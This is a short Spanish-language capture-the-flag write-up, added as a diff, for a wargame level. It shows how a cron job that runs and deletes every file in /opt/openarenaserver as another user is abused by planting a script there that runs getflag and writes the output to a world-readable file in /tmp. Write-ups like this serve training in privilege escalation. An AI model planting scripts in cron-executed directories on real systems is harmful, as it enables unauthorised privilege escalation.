@@ -1,0 +1,29 @@
+# Al iniciar sesión me avisa de que tengo
+# un nuevo mail así que me dirijo al 
+# directorio '/var/mail' donde encuentro
+# un fichero con el nombre level05 que
+# contiene un cronjob:
+#
+# */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+#
+# Veo que se ejecuta cada dos minutos y que ejecuta
+# este fichero en nombre de su creador, el fichero
+# en cuestión contiene:
+
+# #!/bin/sh
+#
+#for i in /opt/openarenaserver/* ; do
+#	(ulimit -t 5; bash -x "$i")
+#	rm -f "$i"
+#done
+#
+#
+# Por lo visto ejecuta y borra todo fichero
+# ubicado en /opt/openarenaserver/
+# por lo que creo un fichero en esa ubicación:
+
+#!/bin/bash
+getflag > /tmp/here && chmod 777 /tmp/here;
+
+Y luego leo la flag en cuestión.
+
